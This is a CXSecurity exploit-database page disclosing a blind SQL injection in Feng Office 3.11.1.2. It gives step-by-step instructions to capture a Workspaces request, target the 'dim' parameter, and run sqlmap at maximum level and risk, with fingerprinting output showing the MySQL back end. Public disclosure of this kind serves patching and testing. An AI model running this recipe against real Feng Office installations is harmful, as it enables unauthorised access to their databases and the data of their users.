---
title: Feng Office 3.11.1.2 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025040019
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-11
fetch_date: 2025-10-06T22:03:53.651554
---

# Feng Office 3.11.1.2 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Feng Office 3.11.1.2 SQL Injection** **2025.04.10**  Credit:  **[Andrey Stoykov](https://cxsecurity.com/author/Andrey%2BStoykov/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Blind SQL Injection - FengOffice
# Date: 7/2024
# Exploit Author: Andrey Stoykov
# Version: 3.11.1.2
# Tested on: Ubuntu 22.04
# Blog: http://msecureltd.blogspot.com
SQL Injection:
1. Login to application
2. Click on "Workspaces"
3. Copy full URL
4. Paste the HTTP GET request into text file
5. Set the injection point to be in the "dim" parameter value
6. Use SQLMap to automate the process
sqlmap -r request.txt --threads 1 --level 5 --risk 3 --dbms=3Dmysql -p dim =
--fingerprint
[...]
[12:13:03] [INFO] confirming MySQL
[12:13:04] [INFO] the back-end DBMS is MySQL
[12:13:04] [INFO] actively fingerprinting MySQL
[12:13:05] [INFO] executing MySQL comment injection fingerprint
web application technology: Apache
back-end DBMS: active fingerprint: MySQL >=3D 5.7
comment injection fingerprint: MySQL 5.7.37
[...]

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040019)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top